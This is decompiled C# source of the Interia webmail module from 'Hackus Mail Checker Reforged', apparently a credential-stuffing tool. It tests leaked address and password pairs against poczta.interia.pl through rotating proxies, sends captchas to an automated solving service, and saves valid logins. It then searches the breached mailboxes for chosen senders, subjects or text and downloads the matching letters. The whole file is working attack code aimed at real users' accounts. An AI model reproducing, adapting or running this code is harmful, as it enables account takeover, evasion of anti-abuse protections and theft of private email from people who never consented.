using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A1 RID: 161
	internal class InteriaClient
	{
		// Token: 0x17000132 RID: 306
		// (get) Token: 0x06000528 RID: 1320 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000529 RID: 1321 RVA: 0x00009ADA File Offset: 0x00007CDA
		public InteriaClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x0600052A RID: 1322 RVA: 0x0001D610 File Offset: 0x0001B810
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x0001D684 File Offset: 0x0001B884
		private OperationResult Login()
		{
			int num = 0;
			OperationResult item;
			for (;;)
			{
				this.WaitPause();
				this.Reset();
				string captchaUid = null;
				string url = null;
				string captchaAnswer = null;
				OperationResult operationResult = this.CreateSession();
				if (operationResult != OperationResult.HttpError)
				{
					if (operationResult != OperationResult.Error)
					{
						if (operationResult == OperationResult.Captcha)
						{
							if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								OperationResult operationResult2 = this.GetCaptchaInfo(ref captchaUid, ref url);
								if (operationResult2 == OperationResult.Error)
								{
									return operationResult2;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage(url);
								item = captchaImage.Item1;
								MemoryStream item2 = captchaImage.Item2;
								if (item == OperationResult.Error)
								{
									break;
								}
								if (item == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item2.ToArray()), "en", false);
								operationResult2 = valueTuple.Item1;
								captchaAnswer = valueTuple.Item2;
								if (operationResult2 == OperationResult.Error)
								{
									return OperationResult.Captcha;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
							}
							else
							{
								if (num <= 3)
								{
									num++;
									continue;
								}
								return OperationResult.Captcha;
							}
						}
						operationResult = this.Authenticate(captchaUid, captchaAnswer);
						if (operationResult == OperationResult.Captcha)
						{
							if (num > 3)
							{
								return OperationResult.Captcha;
							}
							num++;
						}
						else if (operationResult != OperationResult.HttpError)
						{
							return operationResult;
						}
					}
				}
			}
			return item;
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x0001D7AC File Offset: 0x0001B9AC
		private OperationResult CreateSession()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string text = httpRequest.Get("https://poczta.interia.pl/logowanie", null).ToString();
					Match match = Regex.Match(text, "\"client_id\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._clientId = match.Groups[1].Value;
					match = Regex.Match(text, "\"crc\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._crc = match.Groups[1].Value;
					match = Regex.Match(text, "\"code_challenge\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._codeChallenge = match.Groups[1].Value;
					this._deviceUid = Guid.NewGuid().ToString();
					if (text.Contains("\"captcha\":{\"required\":true"))
					{
						return OperationResult.Captcha;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x0001D918 File Offset: 0x0001BB18
		private OperationResult GetCaptchaInfo(ref string captchaUid, ref string captchaUrl)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string input = httpRequest.Get("https://poczta.interia.pl/logowanie/getEnigmaJS", null).ToString();
					Match match = Regex.Match(input, "\"uid\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					captchaUid = match.Groups[1].Value;
					match = Regex.Match(input, "\"url\":\"(.+?)\"");
					if (match.Success)
					{
						captchaUrl = Regex.Unescape(match.Groups[1].Value);
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x0001D9FC File Offset: 0x0001BBFC
				private ValueTuple<OperationResult, MemoryStream> GetCaptchaImage(string url)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						MemoryStream memoryStream = httpRequest.Get(url, null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x0001DA98 File Offset: 0x0001BC98
		private OperationResult Authenticate(string captchaUid = null, string captchaAnswer = null)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						List<KeyValuePair<string, string>> list = new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>("email", this._mailbox.Address),
							new KeyValuePair<string, string>("password", this._mailbox.Password),
							new KeyValuePair<string, string>("client_id", this._clientId),
							new KeyValuePair<string, string>("code_challenge", this._codeChallenge),
							new KeyValuePair<string, string>("crc", this._crc),
							new KeyValuePair<string, string>("webmailSelect", "touchMail"),
							new KeyValuePair<string, string>("code_challenge_method", "S256"),
							new KeyValuePair<string, string>("grant_type", "password"),
							new KeyValuePair<string, string>("response_type", "code"),
							new KeyValuePair<string, string>("isMobilePhone", "1"),
							new KeyValuePair<string, string>("referer", "https%3A%2F%2Fpoczta.interia.pl%2F"),
							new KeyValuePair<string, string>("redirect_uri", "https://poczta.interia.pl/logowanie/sso/login"),
							new KeyValuePair<string, string>("scope", "email basic login"),
							new KeyValuePair<string, string>("device_uid", this._deviceUid)
						};
						if (captchaUid != null && captchaAnswer != null)
						{
							list.Add(new KeyValuePair<string, string>("captcha", "[object Object]"));
							list.Add(new KeyValuePair<string, string>("captcha[id]", captchaUid));
							list.Add(new KeyValuePair<string, string>("captcha[input]", captchaAnswer));
						}
						else
						{
							list.Add(new KeyValuePair<string, string>("captcha", ""));
						}
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(list, false, null);
						httpRequest.Post("https://auth.interia.pl/auth", formUrlEncodedContent).ToString();
						string location = httpRequest.Response.Location;
						if (location.Contains("sso/login?code="))
						{
							this._ssoUrl = location;
							return OperationResult.Ok;
						}
						if (location.Contains("kod+z+obrazka"))
						{
							return OperationResult.Captcha;
						}
						return OperationResult.Bad;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x0001DDB0 File Offset: 0x0001BFB0
		private void ProcessValid()
		{
			if (!this.SearchSettings.Search)
			{
				return;
			}
			if (this.GetSessionCookies() != OperationResult.Ok)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			List<Request> list = new List<Request>();
			while (operationResult == OperationResult.Retry && num <= 2)
			{
				if (!flag && this.SearchSettings.Search)
				{
					operationResult = this.SearchMessages(list);
					if (operationResult == OperationResult.Ok)
					{
						flag = true;
					}
				}
				else
				{
					operationResult = OperationResult.Ok;
				}
				if (operationResult != OperationResult.Retry)
				{
					if (operationResult == OperationResult.Bad)
					{
						break;
					}
				}
				else if (ProxySettings.Instance.UseProxy)
				{
					this._proxyClient = ProxyManager.Instance.GetProxy();
				}
			}
			foreach (Request request in list)
			{
				int count = request.Count;
				if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
			}
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x0001DEF4 File Offset: 0x0001C0F4
		private OperationResult GetSessionCookies()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.Get(this._ssoUrl, null).ToString();
						string location = httpRequest.Response.Location;
						if (location != "https://poczta.interia.pl/")
						{
							return OperationResult.Error;
						}
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						location = httpRequest.Get("https://poczta.interia.pl/next/", null).Location;
						if (location == null)
						{
							return OperationResult.Error;
						}
						Match match = Regex.Match(location, "\\?uid=(.+)");
						if (!match.Success)
						{
							return OperationResult.Error;
						}
						this._xsrfToken = match.Groups[1].Value;
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x0001E004 File Offset: 0x0001C204
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => r.Sender == request.Sender && r.Body == request.Body && r.Subject == request.Subject);
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedUids != null && request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedUids.Add(uid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x0001E284 File Offset: 0x0001C484
		private OperationResult Search(Request searchRequest)
		{
			if (searchRequest.Subject != null && searchRequest.Body != null)
			{
				return OperationResult.Ok;
			}
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader("X-CACHE-IS-VALID", "true");
					httpRequest.AddHeader("X-XSRF-TOKEN", this._xsrfToken);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					string text = this.BuildSearchRequest(httpRequest, searchRequest);
					string input = httpRequest.Post("https://poczta.interia.pl/next/folder/1/mails", text, "application/json").ToString();
					Match match = Regex.Match(input, "\"total\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					if (!(match.Groups[1].Value == "null"))
					{
						searchRequest.Count = int.Parse(match.Groups[1].Value);
						foreach (object obj in Regex.Matches(input, "\"id\":\"(.+?)\","))
						{
							Match match2 = (Match)obj;
							searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
						}
						return OperationResult.Ok;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x0001E484 File Offset: 0x0001C684
		private OperationResult FetchMessage(Uid uid, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader("X-CACHE-IS-VALID", "true");
					httpRequest.AddHeader("X-XSRF-TOKEN", this._xsrfToken);
					httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
					string input = httpRequest.Get("https://poczta.interia.pl/next/mail/" + uid.UID.ToString(), null).ToString();
					Match match = Regex.Match(input, "\"date\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Date = DateTime.Parse(match.Groups[1].Value);
					match = Regex.Match(input, "\"content\":\"(.+?)\",");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment("text/html", "<head><meta http-equiv='Content-Type' content='text/html;charset=UTF-8'></head>" + match.Groups[1].Value));
					match = Regex.Match(input, "\"fromEmail\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.From = match.Groups[1].Value;
					match = Regex.Match(input, "\"subject\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x0001E698 File Offset: 0x0001C898
		private string BuildSearchRequest(HttpRequest httpRequest, Request request)
		{
			httpRequest.AddUrlParam("cacheTime", (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
			httpRequest.AddUrlParam("page", 1);
			httpRequest.AddUrlParam("ver", 2);
			StringBuilder stringBuilder = new StringBuilder("{\"isSearch\":true");
			if (request.Sender != null)
			{
				stringBuilder.Append(",\"from\":\"" + request.Sender + "\"");
			}
			if (request.Subject != null)
			{
				httpRequest.AddUrlParam("search", request.Subject);
			}
			else if (request.Body != null)
			{
				stringBuilder.Append(",\"subject\":\"" + request.Body + "\"");
				stringBuilder.Append(",\"isSearchInContent\":true");
				httpRequest.AddUrlParam("search", request.Body);
			}
			if (request.CheckDate)
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append(",\"date_from\":\"" + request.DateFrom.Value.ToString("yyyy-MM-dd") + "\"");
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append(",\"date_to\":\"" + request.DateTo.Value.ToString("yyyy-MM-dd") + "\"");
				}
			}
			else if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null)
				{
					stringBuilder.Append(",\"date_from\":\"" + SearchSettings.Instance.DateFrom.Value.ToString("yyyy-MM-dd") + "\"");
				}
				if (SearchSettings.Instance.DateTo != null)
				{
					stringBuilder.Append(",\"date_to\":\"" + SearchSettings.Instance.DateTo.Value.ToString("yyyy-MM-dd") + "\"");
				}
			}
			stringBuilder.Append("}");
			return stringBuilder.ToString();
		}

		// Token: 0x06000536 RID: 1334 RVA: 0x0001E94C File Offset: 0x0001CB4C
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1";
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x00009AE9 File Offset: 0x00007CE9
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x06000538 RID: 1336 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002C4 RID: 708
		private Mailbox _mailbox;

		// Token: 0x040002C5 RID: 709
		private ProxyClient _proxyClient;

		// Token: 0x040002C6 RID: 710
		private CookieDictionary _cookies;

		// Token: 0x040002C7 RID: 711
		private string _codeChallenge;

		// Token: 0x040002C8 RID: 712
		private string _deviceUid;

		// Token: 0x040002C9 RID: 713
		private string _clientId;

		// Token: 0x040002CA RID: 714
		private string _crc;

		// Token: 0x040002CB RID: 715
		private string _xsrfToken;

		// Token: 0x040002CC RID: 716
		private string _ssoUrl;
	}
}
